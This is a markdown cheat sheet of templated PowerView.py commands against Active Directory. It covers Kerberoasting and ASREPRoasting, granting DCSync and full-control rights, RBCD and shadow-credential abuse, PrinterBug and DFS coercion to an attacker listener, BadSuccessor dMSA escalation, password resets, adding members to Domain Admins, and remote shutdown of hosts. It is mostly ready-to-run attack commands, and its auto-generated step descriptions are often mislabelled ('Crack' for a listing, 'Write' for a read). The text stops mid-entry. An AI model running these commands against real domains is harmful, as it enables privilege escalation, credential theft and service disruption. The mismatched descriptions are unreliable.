# PowerView.py

<!-- cheat
export pvpy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

var transport = printf 'ldap\tLDAP (default, 389)\nldaps\tLDAPS (636, TLS)\ngc\tGlobal Catalog (3268)\ngc-ldaps\tGlobal Catalog over TLS (3269)\nadws\tADWS (9389)\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ transport" --map "cut -f1"

if $transport == ldap
var transport_flag
fi

if $transport == ldaps
var transport_flag := --use-ldaps
fi

if $transport == gc
var transport_flag := --use-gc
fi

if $transport == gc-ldaps
var transport_flag := --use-gc-ldaps
fi

if $transport == adws
var transport_flag := --use-adws
fi

if $auth_method == hash
var auth_target := $domain/$user@$rhost_ip -H :$credential $transport_flag
fi

if $auth_method == password
var auth_target := $domain/$user:'$credential'@$rhost_ip $transport_flag
fi

if $auth_method == kerberos
var auth_target := $domain/$user@$rhost_ip -k $transport_flag
fi
-->

## Connect

### Open PowerView session

Execute open PowerView session with PowerView.py.

```sh title:"PowerView.py Execute Open PowerView Session"
powerview $auth_target
```
<!-- cheat
import domain_ip
import users
import passwords
import pvpy_auth
-->

## User Enumeration

### Safe spray candidates

Enumerate safe spray candidates with PowerView.py.

```sh title:"PowerView.py Enumerate Safe Spray Candidates"
Get-DomainUser -Where 'badPwdCount contains 0'
```
<!-- cheat -->

### Kerberos encryption support

Enumerate kerberos encryption support with PowerView.py.

```sh title:"PowerView.py Enumerate Kerberos Encryption Support"
Get-DomainUser -SPN -Select samaccountname,msDS-SupportedEncryptionTypes
```
<!-- cheat -->

### Privileged users

Enumerate privileged users with PowerView.py.

```sh title:"PowerView.py Enumerate Privileged Users"
Get-DomainUser -AdminCount
```
<!-- cheat -->

### ASREPRoastable users

Crack ASREPRoastable users with PowerView.py.

```sh title:"PowerView.py Crack ASREPRoastable Users"
Get-DomainUser -PreAuthNotRequired
```
<!-- cheat -->

### Unconstrained delegation users

Enumerate unconstrained delegation users with PowerView.py.

```sh title:"PowerView.py Enumerate Unconstrained Delegation Users"
Get-DomainUser -Unconstrained
```
<!-- cheat -->

### Constrained delegation users

Enumerate constrained delegation users with PowerView.py.

```sh title:"PowerView.py Enumerate Constrained Delegation Users"
Get-DomainUser -TrustedToAuth
```
<!-- cheat -->

### Locked out accounts

Enumerate locked out accounts with PowerView.py.

```sh title:"PowerView.py Enumerate Locked Out Accounts"
Get-DomainUser -LockedOut
```
<!-- cheat -->

### Disabled accounts

Enumerate disabled accounts with PowerView.py.

```sh title:"PowerView.py Enumerate Disabled Accounts"
Get-DomainUser -Disabled
```
<!-- cheat -->

### Users with expired passwords

Dump users with expired passwords with PowerView.py.

```sh title:"PowerView.py Dump Users with Expired Passwords"
Get-DomainUser -PassExpired
```
<!-- cheat -->

### Users abused for RBCD

Read users abused for RBCD with PowerView.py.

```sh title:"PowerView.py Read Users Abused for RBCD"
Get-DomainUser -RBCD
```
<!-- cheat -->

### Users with shadow credentials

Dump users with shadow credentials with PowerView.py.

```sh title:"PowerView.py Dump Users with Shadow Credentials"
Get-DomainUser -ShadowCred
```
<!-- cheat -->

### Users by department

Enumerate users by department with PowerView.py.

```sh title:"PowerView.py Enumerate Users by Department"
Get-DomainUser -Department "$department"
```
<!-- cheat
var department --- --header "Department name (e.g. IT)"
-->

### Users by group membership

Enumerate users by group membership with PowerView.py.

```sh title:"PowerView.py Enumerate Users by Group Membership"
Get-DomainUser -MemberOf "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

## Computer Enumeration

### LAPS-enabled computers

Read LAPS enabled computers with PowerView.py.

```sh title:"PowerView.py Read LAPS Enabled Computers"
Get-DomainComputer -LAPS
```
<!-- cheat -->

### Unconstrained delegation (non-DC)

Enumerate unconstrained delegation (non DC) with PowerView.py.

```sh title:"PowerView.py Enumerate Unconstrained Delegation (non DC)"
Get-DomainComputer -Unconstrained -ExcludeDCs
```
<!-- cheat -->

### Domain printers

Enumerate domain printers with PowerView.py.

```sh title:"PowerView.py Enumerate Domain Printers"
Get-DomainComputer -Printers
```
<!-- cheat -->

### Obsolete operating systems

Enumerate obsolete operating systems with PowerView.py.

```sh title:"PowerView.py Enumerate Obsolete Operating Systems"
Get-DomainComputer -Obsolete
```
<!-- cheat -->

### Computers with resolved IPs

Enumerate computers with resolved IPs with PowerView.py.

```sh title:"PowerView.py Enumerate Computers with Resolved IPs"
Get-DomainComputer -IncludeIP -Properties dnshostname -TableView
```
<!-- cheat -->

### Pre-Windows 2000 computers

Enumerate pre windows 2000 computers with PowerView.py.

```sh title:"PowerView.py Enumerate Pre Windows 2000 Computers"
Get-DomainComputer -Pre2K
```
<!-- cheat -->

### BitLocker recovery keys

Enumerate BitLocker recovery keys with PowerView.py.

```sh title:"PowerView.py Enumerate BitLocker Recovery Keys"
Get-DomainComputer -BitLocker
```
<!-- cheat -->

### Readable gMSA passwords

Read readable gMSA passwords with PowerView.py.

```sh title:"PowerView.py Read Readable GMSA Passwords"
Get-DomainComputer -GMSAPassword
```
<!-- cheat -->

## Group & ACL Operations

### List group members

List group members with PowerView.py.

```sh title:"PowerView.py List Group Members"
Get-DomainGroupMember -Identity "$group"
```
<!-- cheat
var group --- --header "Group name (e.g. Domain Admins)"
-->

### Groups a user belongs to

Run groups a user belongs to with PowerView.py.

```sh title:"PowerView.py Run Groups a User Belongs to"
Get-DomainGroup -MemberIdentity $target_user
```
<!-- cheat
var target_user --- --header "User samAccountName"
-->

### ACLs for an object

Read ACLs for an object with PowerView.py.

```sh title:"PowerView.py Read ACLs for an Object"
Get-DomainObjectAcl -Identity "$identity" -ResolveGUIDs
```
<!-- cheat
var identity --- --header "Object identity (samAccountName, DN, SID)"
-->

### ACLs by SID

Run ACLs by SID with PowerView.py.

```sh title:"PowerView.py Run ACLs by SID"
Get-DomainObjectAcl -Identity $identity -SecurityIdentifier $sid
```
<!-- cheat
var identity --- --header "Target object (e.g. DC01)"
var sid --- --header "SecurityIdentifier (S-1-5-21-...)"
-->

### Object owner

Write object owner with PowerView.py.

```sh title:"PowerView.py Write Object Owner"
Get-DomainObjectOwner -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity"
-->

## DNS Operations

### List DNS zones

List DNS zones with PowerView.py.

```sh title:"PowerView.py List DNS Zones"
Get-DomainDNSZone
```
<!-- cheat -->

### List forest DNS zones

List forest DNS zones with PowerView.py.

```sh title:"PowerView.py List Forest DNS Zones"
Get-DomainDNSZone -Forest
```
<!-- cheat -->

### Records in a DNS zone

Dump records in a DNS zone with PowerView.py.

```sh title:"PowerView.py Dump Records in a DNS Zone"
Get-DomainDNSRecord -ZoneName $zone
```
<!-- cheat
var zone --- --header "DNS zone (e.g. domain.local)"
-->

### Add DNS record

Add DNS record with PowerView.py.

```sh title:"PowerView.py Add DNS Record"
Add-DomainDNSRecord -RecordName $record -RecordAddress $lhost
```
<!-- cheat
import tun_ip
var record --- --header "Record name"
-->

### Disable DNS record

Disable DNS record with PowerView.py.

```sh title:"PowerView.py Disable DNS Record"
Disable-DomainDNSRecord -RecordName $record
```
<!-- cheat
var record --- --header "Record name to disable"
-->

## Kerberos Attacks

### Kerberoast all SPNs

Crack kerberoast all SPNs with PowerView.py.

```sh title:"PowerView.py Crack Kerberoast All SPNs"
Invoke-Kerberoast
```
<!-- cheat -->

### Kerberoast (OPSEC AES)

Run kerberoast (OPSEC AES) with PowerView.py.

```sh title:"PowerView.py Run Kerberoast (OPSEC AES)"
Invoke-Kerberoast -Opsec
```
<!-- cheat -->

### ASREPRoast

Crack ASREPRoast with PowerView.py.

```sh title:"PowerView.py Crack ASREPRoast"
Invoke-ASREPRoast
```
<!-- cheat -->

## Delegation

### Find RBCD configurations

Find RBCD configurations with PowerView.py.

```sh title:"PowerView.py Find RBCD Configurations"
Get-DomainRBCD
```
<!-- cheat -->

### Set RBCD delegation

Set RBCD delegation with PowerView.py.

```sh title:"PowerView.py Set RBCD Delegation"
Set-DomainRBCD -Identity $target -DelegateFrom $attacker
```
<!-- cheat
var target --- --header "Target computer (e.g. targetcomputer$)"
var attacker --- --header "Attacker computer (e.g. attackercomputer$)"
-->

## Certificate Services

### Vulnerable certificate templates

Read vulnerable certificate templates with PowerView.py.

```sh title:"PowerView.py Read Vulnerable Certificate Templates"
Get-DomainCATemplate -Vulnerable -ResolveSIDs
```
<!-- cheat -->

### List CAs with checks

List CAs with checks with PowerView.py.

```sh title:"PowerView.py List CAs with Checks"
Get-DomainCA -CheckAll
```
<!-- cheat -->

## Shadow Credentials

### Add shadow credential

Add shadow credential with PowerView.py.

```sh title:"PowerView.py Add Shadow Credential"
Set-ShadowCredential -Identity $target -Add
```
<!-- cheat
var target --- --header "Target identity"
-->

### List shadow credentials

List shadow credentials with PowerView.py.

```sh title:"PowerView.py List Shadow Credentials"
Get-ShadowCredential -Identity $target
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
-->

## Service Accounts

### List gMSA accounts

List gMSA accounts with PowerView.py.

```sh title:"PowerView.py List GMSA Accounts"
Get-DomainGMSA
```
<!-- cheat -->

### List dMSA accounts

List dMSA accounts with PowerView.py.

```sh title:"PowerView.py List DMSA Accounts"
Get-DomainDMSA
```
<!-- cheat -->

## Remote Computer Operations

### Remote sessions

Enumerate remote sessions with PowerView.py.

```sh title:"PowerView.py Enumerate Remote Sessions"
Get-NetSession -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer (e.g. DC01)"
-->

### List remote shares

List remote shares with PowerView.py.

```sh title:"PowerView.py List Remote Shares"
Get-NetShare -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### List running services

List running services with PowerView.py.

```sh title:"PowerView.py List Running Services"
Get-NetService -Computer $computer -IsRunning
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Login events from remote host

Run login events from remote host with PowerView.py.

```sh title:"PowerView.py Run Login Events from Remote Host"
Get-EventLog -Computer $computer -EventId $eventid -MaxEvents $max
```
<!-- cheat
var computer --- --header "Remote computer"
var eventid := 4624
var max := 50
-->

### List remote processes

List remote processes with PowerView.py.

```sh title:"PowerView.py List Remote Processes"
Get-NetProcess -Computer $computer
```
<!-- cheat
var computer --- --header "Remote computer"
-->

### Find local admin access

Find local admin access with PowerView.py.

```sh title:"PowerView.py Find Local Admin Access"
Find-LocalAdminAccess
```
<!-- cheat -->

## Coercion Attacks

### PrinterBug coercion

Trigger PrinterBug coercion with PowerView.py.

```sh title:"PowerView.py Trigger PrinterBug Coercion"
Invoke-PrinterBug -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target (e.g. DC01)"
-->

### DFS coercion

Trigger DFS coercion with PowerView.py.

```sh title:"PowerView.py Trigger DFS Coercion"
Invoke-DFSCoerce -Target $target -Listener $lhost
```
<!-- cheat
import tun_ip
var target --- --header "Coercion target"
-->

## Object Modification

### Set object attribute

Set object attribute with PowerView.py.

```sh title:"PowerView.py Set Object Attribute"
Set-DomainObject -Identity $identity -Set '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. description)"
var value --- --header "Attribute value"
-->

### Append attribute value

Read append attribute value with PowerView.py.

```sh title:"PowerView.py Read Append Attribute Value"
Set-DomainObject -Identity $identity -Append '$attribute=$value'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name (e.g. servicePrincipalname)"
var value --- --header "Value to append"
-->

### Clear attribute

Read clear attribute with PowerView.py.

```sh title:"PowerView.py Read Clear Attribute"
Set-DomainObject -Identity $identity -Clear $attribute
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name to clear"
-->

### Set attribute from file

Set attribute from file with PowerView.py.

```sh title:"PowerView.py Set Attribute from File"
Set-DomainObject -Identity $identity -Set '$attribute=@$filepath'
```
<!-- cheat
var identity --- --header "Target object"
var attribute --- --header "Attribute name"
var filepath --- --header "Path to file (e.g. /path/to/file)"
-->

### Change user password

Read change user password with PowerView.py.

```sh title:"PowerView.py Read Change User Password"
Set-DomainUserPassword -Identity $target_user -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "Target user"
-->

### Move object to OU

Read move object to OU with PowerView.py.

```sh title:"PowerView.py Read Move Object to OU"
Set-DomainObjectDN -Identity $identity -DestinationDN "$dn"
```
<!-- cheat
var identity --- --header "Target object"
var dn --- --header "Destination DN (e.g. OU=IT,DC=domain,DC=local)"
-->

## Output Formatting

### Table view

Run table view with PowerView.py.

```sh title:"PowerView.py Run Table View"
Get-DomainUser -Properties $properties -TableView
```
<!-- cheat
var properties := samaccountname,description
-->

### Markdown table output

Run markdown table output with PowerView.py.

```sh title:"PowerView.py Run Markdown Table Output"
Get-DomainUser -Properties $properties -TableView md
```
<!-- cheat
var properties := samaccountname,description
-->

### CSV output

Read CSV output with PowerView.py.

```sh title:"PowerView.py Read CSV Output"
Get-DomainUser -Properties $properties -TableView csv
```
<!-- cheat
var properties := samaccountname,description
-->

### Filter: contains

Run filter: contains with PowerView.py.

```sh title:"PowerView.py Run Filter: Contains"
Get-DomainUser -Where 'samaccountname contains $value'
```
<!-- cheat
var value --- --header "Substring to match (e.g. admin)"
-->

### Filter: equals

Run filter: equals with PowerView.py.

```sh title:"PowerView.py Run Filter: Equals"
Get-DomainUser -Where 'samaccountname eq $value'
```
<!-- cheat
var value --- --header "Exact value (e.g. Administrator)"
-->

### Filter: in

Start filter: in with PowerView.py.

```sh title:"PowerView.py Start Filter: in"
Get-DomainUser -Where 'description in $value'
```
<!-- cheat
var value --- --header "Token to look for (e.g. password)"
-->

### Sort results

Run sort results with PowerView.py.

```sh title:"PowerView.py Run Sort Results"
Get-DomainUser -Properties $properties -SortBy $sortby
```
<!-- cheat
var properties := samaccountname,lastLogon
var sortby := lastLogon
-->

### Count enabled users

Check count enabled users with PowerView.py.

```sh title:"PowerView.py Check Count Enabled Users"
Get-DomainUser -Enabled -Count
```
<!-- cheat -->

## Domain & Forest Info

### Domain info

Show domain info with PowerView.py.

```sh title:"PowerView.py Show Domain Info"
Get-Domain -Properties $properties
```
<!-- cheat
var properties := ms-DS-MachineAccountQuota
-->

### List domain controllers

List domain controllers with PowerView.py.

```sh title:"PowerView.py List Domain Controllers"
Get-DomainController -Properties dnshostname,operatingsystem
```
<!-- cheat -->

### List OUs

List OUs with PowerView.py.

```sh title:"PowerView.py List OUs"
Get-DomainOU -ResolveGPLink
```
<!-- cheat -->

### Writable OUs

Show writable OUs with PowerView.py.

```sh title:"PowerView.py Show Writable OUs"
Get-DomainOU -Writable
```
<!-- cheat -->

### Raw object lookup

Show raw object lookup with PowerView.py.

```sh title:"PowerView.py Show Raw Object Lookup"
Get-DomainObject -Identity "$identity"
```
<!-- cheat
var identity --- --header "Object identity (e.g. DC01$)"
-->

### Tombstoned objects

Show tombstoned objects with PowerView.py.

```sh title:"PowerView.py Show Tombstoned Objects"
Get-DomainObject -Deleted
```
<!-- cheat -->

### Restore deleted object

Show restore deleted object with PowerView.py.

```sh title:"PowerView.py Show Restore Deleted Object"
Restore-DomainObject -Identity $identity -TargetPath "$dn"
```
<!-- cheat
var identity --- --header "Deleted object (e.g. deleteduser)"
var dn --- --header "Target DN (e.g. OU=Users,DC=domain,DC=local)"
-->

### Set object owner

Set object owner with PowerView.py.

```sh title:"PowerView.py Set Object Owner"
Set-DomainObjectOwner -TargetIdentity "$target" -PrincipalIdentity $principal
```
<!-- cheat
var target --- --header "Target object DN/identity"
var principal --- --header "New owner principal (e.g. lowpriv)"
-->

### Clear LDAP cache

Show clear LDAP cache with PowerView.py.

```sh title:"PowerView.py Show Clear LDAP Cache"
Clear-Cache
```
<!-- cheat -->

## Account State

### Disable account

Disable account with PowerView.py.

```sh title:"PowerView.py Disable Account"
Disable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Enable account

Enable account with PowerView.py.

```sh title:"PowerView.py Enable Account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Target account"
-->

### Unlock account

Run unlock account with PowerView.py.

```sh title:"PowerView.py Run Unlock Account"
Unlock-ADAccount -Identity $target_user
```
<!-- cheat
var target_user --- --header "Locked account (e.g. lockeduser)"
-->

### Switch session credentials

Dump switch session credentials with PowerView.py.

```sh title:"PowerView.py Dump Switch Session Credentials"
Login-As -Username $target_user -Domain $domain -Password '$new_password'
```
<!-- cheat
import domain_ip
import passwords
var target_user --- --header "Username"
-->

## Object Lifecycle

### Add domain user

Add domain user with PowerView.py.

```sh title:"PowerView.py Add Domain User"
Add-DomainUser -UserName $target_user -Password '$new_password'
```
<!-- cheat
import passwords
var target_user --- --header "New username"
-->

### Remove domain user

Remove domain user with PowerView.py.

```sh title:"PowerView.py Remove Domain User"
Remove-DomainUser -Identity $target_user
```
<!-- cheat
var target_user --- --header "User to delete"
-->

### Add domain computer

Add domain computer with PowerView.py.

```sh title:"PowerView.py Add Domain Computer"
Add-DomainComputer -ComputerName $rhost_name -ComputerPass $new_password
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer name (no trailing $)"
-->

### Remove domain computer

Remove domain computer with PowerView.py.

```sh title:"PowerView.py Remove Domain Computer"
Remove-DomainComputer -ComputerName $rhost_name
```
<!-- cheat
var rhost_name --- --header "Computer name"
-->

### Reset computer password

Dump reset computer password with PowerView.py.

```sh title:"PowerView.py Dump Reset Computer Password"
Set-DomainComputerPassword -Identity '$rhost_name' -AccountPassword '$new_password'
```
<!-- cheat
import passwords
var rhost_name --- --header "Computer (e.g. COMPUTER01$)"
-->

### Add domain group

Add domain group with PowerView.py.

```sh title:"PowerView.py Add Domain Group"
Add-DomainGroup -Identity "$group"
```
<!-- cheat
var group --- --header "New group name"
-->

### Add user to group

Add user to group with PowerView.py.

```sh title:"PowerView.py Add User to Group"
Add-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group (e.g. Domain Admins)"
var target_user --- --header "Member to add"
-->

### Remove user from group

Remove user from group with PowerView.py.

```sh title:"PowerView.py Remove User from Group"
Remove-DomainGroupMember -Identity "$group" -Members $target_user
```
<!-- cheat
var group --- --header "Target group"
var target_user --- --header "Member to remove"
-->

### Add OU

Add OU with PowerView.py.

```sh title:"PowerView.py Add OU"
Add-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "New OU name"
-->

### Remove OU

Remove OU with PowerView.py.

```sh title:"PowerView.py Remove OU"
Remove-DomainOU -Identity "$ou"
```
<!-- cheat
var ou --- --header "OU to delete"
-->

### Generic object remove

Remove generic object remove with PowerView.py.

```sh title:"PowerView.py Remove Generic Object Remove"
Remove-DomainObject -Identity $identity
```
<!-- cheat
var identity --- --header "Object to delete"
-->

## ACL Editing

### Grant DCSync rights

Set grant DCSync rights with PowerView.py.

```sh title:"PowerView.py Set Grant DCSync Rights"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights dcsync
```
<!-- cheat
var target --- --header "Target object (usually domain root or DC)"
var principal --- --header "Principal to grant rights to"
-->

### Grant full control ACL

Run grant full control ACL with PowerView.py.

```sh title:"PowerView.py Run Grant Full Control ACL"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights fullcontrol
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to grant rights to"
-->

### Grant RBCD ACL

Run grant RBCD ACL with PowerView.py.

```sh title:"PowerView.py Run Grant RBCD ACL"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights RBCD
```
<!-- cheat
var target --- --header "Target computer (e.g. SQL03)"
var principal --- --header "Attacker-controlled computer (e.g. POC113)"
-->

### Remove ACL entry

Remove ACL entry with PowerView.py.

```sh title:"PowerView.py Remove ACL Entry"
Remove-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var target --- --header "Target object"
var principal --- --header "Principal to remove"
var rights --- --header "Rights to remove (e.g. dcsync)"
-->

## GPO

### List GPOs

List GPOs with PowerView.py.

```sh title:"PowerView.py List GPOs"
Get-DomainGPO -Properties displayname,gpcfilesyspath
```
<!-- cheat -->

### GPO local group settings

Set GPO local group settings with PowerView.py.

```sh title:"PowerView.py Set GPO Local Group Settings"
Get-DomainGPOLocalGroup -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name (e.g. Default Domain Policy)"
-->

### Dump GPO settings

Dump GPO settings with PowerView.py.

```sh title:"PowerView.py Dump GPO Settings"
Get-DomainGPOSettings -Identity "$gpo"
```
<!-- cheat
var gpo --- --header "GPO display name"
-->

### Link GPO to OU

Run link GPO to OU with PowerView.py.

```sh title:"PowerView.py Run Link GPO to OU"
Add-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID (e.g. {31B2F340-016D-11D2-945F-00C04FB984F9})"
var target --- --header "Target OU/container DN"
-->

### Unlink GPO

Run unlink GPO with PowerView.py.

```sh title:"PowerView.py Run Unlink GPO"
Remove-GPLink -GUID "$guid" -TargetIdentity "$target"
```
<!-- cheat
var guid --- --header "GPO GUID"
var target --- --header "Target OU/container DN"
-->

### Create new GPO

Create new GPO with PowerView.py.

```sh title:"PowerView.py Create New GPO"
Add-DomainGPO -Identity "$name" -LinkTo "$target"
```
<!-- cheat
var name --- --header "New GPO name"
var target --- --header "OU/container DN to link to"
-->

## Domain Trusts & Forest

### List domain trusts

List domain trusts with PowerView.py.

```sh title:"PowerView.py List Domain Trusts"
Get-DomainTrust -Properties trustDirection,trustPartner
```
<!-- cheat -->

### Domain trust keys

Run domain trust keys with PowerView.py.

```sh title:"PowerView.py Run Domain Trust Keys"
Get-DomainTrustKey
```
<!-- cheat -->

### Foreign users

Run foreign users with PowerView.py.

```sh title:"PowerView.py Run Foreign Users"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Run foreign group members with PowerView.py.

```sh title:"PowerView.py Run Foreign Group Members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

## ADCS Additions

### Modify CA template

Create modify CA template with PowerView.py.

```sh title:"PowerView.py Create Modify CA Template"
Set-DomainCATemplate -Identity $template -Set '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute (e.g. pKIExtendedKeyUsage)"
var value --- --header "Value (e.g. Client Authentication)"
-->

### Append to CA template

Create append to CA template with PowerView.py.

```sh title:"PowerView.py Create Append to CA Template"
Set-DomainCATemplate -Identity $template -Append '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute"
var value --- --header "Value to append"
-->

### Clear CA template attribute

Create clear CA template attribute with PowerView.py.

```sh title:"PowerView.py Create Clear CA Template Attribute"
Set-DomainCATemplate -Identity $template -Clear $attribute
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute to clear"
-->

### Duplicate CA template

Read duplicate CA template with PowerView.py.

```sh title:"PowerView.py Read Duplicate CA Template"
Add-DomainCATemplate -Duplicate $source -Name $name -DisplayName "$display"
```
<!-- cheat
var source --- --header "Source template to duplicate"
var name --- --header "New template name"
var display --- --header "New template display name"
-->

### Add ACL to CA template

Add ACL to CA template with PowerView.py.

```sh title:"PowerView.py Add ACL to CA Template"
Add-DomainCATemplateAcl -Template $template -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var template --- --header "Template name"
var principal --- --header "Principal to grant rights to"
var rights --- --header "Rights (e.g. Enroll)"
-->

### Remove CA template

Remove CA template with PowerView.py.

```sh title:"PowerView.py Remove CA Template"
Remove-DomainCATemplate -Identity $template
```
<!-- cheat
var template --- --header "Template to remove"
-->

## Service Accounts (gMSA/dMSA)

### Add gMSA

Add gMSA with PowerView.py.

```sh title:"PowerView.py Add GMSA"
Add-DomainGMSA -Identity $name -PrincipalsAllowedToRetrieveManagedPassword "$principal"
```
<!-- cheat
var name --- --header "New gMSA name"
var principal --- --header "Principal allowed to retrieve password (e.g. Domain Admins)"
-->

### Remove gMSA

Remove gMSA with PowerView.py.

```sh title:"PowerView.py Remove GMSA"
Remove-DomainGMSA -Identity $name
```
<!-- cheat
var name --- --header "gMSA to remove"
-->

### Add dMSA

Add dMSA with PowerView.py.

```sh title:"PowerView.py Add DMSA"
Add-DomainDMSA -Identity $name -SupersededAccount $victim
```
<!-- cheat
var name --- --header "New dMSA name"
var victim --- --header "Account to be superseded"
-->

### Remove dMSA

Remove dMSA with PowerView.py.

```sh title:"PowerView.py Remove DMSA"
Remove-DomainDMSA -Identity $name
```
<!-- cheat
var name --- --header "dMSA to remove"
-->

### BadSuccessor (dMSA escalation)

Run BadSuccessor (dMSA escalation) with PowerView.py.

```sh title:"PowerView.py Run BadSuccessor (dMSA Escalation)"
Invoke-BadSuccessor -DMSAName "$dmsa" -TargetIdentity "$target"
```
<!-- cheat
var dmsa --- --header "Attacker-controlled dMSA (e.g. evil_dmsa)"
var target --- --header "Target identity (e.g. Domain Admins)"
-->

## Shadow Credentials Extras

### List shadow credential device IDs

List shadow credential device IDs with PowerView.py.

```sh title:"PowerView.py List Shadow Credential Device IDs"
Set-ShadowCredential -Identity $target -List
```
<!-- cheat
var target --- --header "Target identity"
-->

### Remove specific shadow credential

Remove specific shadow credential with PowerView.py.

```sh title:"PowerView.py Remove Specific Shadow Credential"
Remove-ShadowCredential -Identity $target -DeviceId $deviceid
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
var deviceid --- --header "Device ID GUID"
-->

### Clear all shadow credentials

Dump clear all shadow credentials with PowerView.py.

```sh title:"PowerView.py Dump Clear All Shadow Credentials"
Remove-ShadowCredential -Identity $target -All
```
<!-- cheat
var target --- --header "Target identity"
-->

## Exchange

### List Exchange servers

List exchange servers with PowerView.py.

```sh title:"PowerView.py List Exchange Servers"
Get-ExchangeServer -Properties cn,serialNumber
```
<!-- cheat -->

### List mailboxes

List mailboxes with PowerView.py.

```sh title:"PowerView.py List Mailboxes"
Get-ExchangeMailbox -Identity $identity
```
<!-- cheat
var identity --- --header "Mailbox identity (e.g. administrator)"
-->

### List Exchange databases

List exchange databases with PowerView.py.

```sh title:"PowerView.py List Exchange Databases"
Get-ExchangeDatabase
```
<!-- cheat -->

## Coercion Extras

### Enable EFSRPC

Enable EFSRPC with PowerView.py.

```sh title:"PowerView.py Enable EFSRPC"
Enable-EFSRPC -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer (e.g. DC01)"
-->

## Misc

### Resolve SID

Run resolve SID with PowerView.py.

```sh title:"PowerView.py Run Resolve SID"
ConvertFrom-SID -ObjectSID $sid
```
<!-- cheat
var sid --- --header "SID (e.g. S-1-5-21-xxx-512)"
-->

### Decode UAC value

Decode UAC value with PowerView.py.

```sh title:"PowerView.py Decode UAC Value"
ConvertFrom-UACValue -Value $value
```
<!-- cheat
var value --- --header "UAC value (e.g. 66048)"
-->

### Named pipes on host

Run named pipes on host with PowerView.py.

```sh title:"PowerView.py Run Named Pipes on Host"
Get-NamedPipes -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Optional pipe name filter (e.g. sqlsvc)"
-->

### Local users on host

Dump local users on host with PowerView.py.

```sh title:"PowerView.py Dump Local Users on Host"
Get-LocalUser -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (network) sessions

Enumerate logged on (network) sessions with PowerView.py.

```sh title:"PowerView.py Enumerate Logged on (network) Sessions"
Get-NetLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (registry)

Run logged on (registry) with PowerView.py.

```sh title:"PowerView.py Run Logged on (registry)"
Get-RegLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Computer info

Show computer info with PowerView.py.

```sh title:"PowerView.py Show Computer Info"
Get-NetComputerInfo -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Terminal sessions

List terminal sessions with PowerView.py.

```sh title:"PowerView.py List Terminal Sessions"
Get-NetTerminalSession -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disconnect terminal session

Run disconnect terminal session with PowerView.py.

```sh title:"PowerView.py Run Disconnect Terminal Session"
Remove-NetTerminalSession -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID (integer)"
-->

### Log off session

Run log off session with PowerView.py.

```sh title:"PowerView.py Run Log Off Session"
Logoff-Session -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID to log off"
-->

### Kill remote process

Run kill remote process with PowerView.py.

```sh title:"PowerView.py Run Kill Remote Process"
Stop-NetProcess -Computer $computer -Pid $pid
```
<!-- cheat
var computer --- --header "Target computer"
var pid --- --header "Target PID"
-->

### Shut down host

Run shut down host with PowerView.py.

```sh title:"PowerView.py Run Shut Down Host"
Stop-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Restart host

Start restart host with PowerView.py.

```sh title:"PowerView.py Start Restart Host"
Restart-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable RDP

Enable RDP with PowerView.py.

```sh title:"PowerView.py Enable RDP"
Enable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable RDP

Disable RDP with PowerView.py.

```sh title:"PowerView.py Disable RDP"
Disable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable Shadow RDP

Enable shadow RDP with PowerView.py.

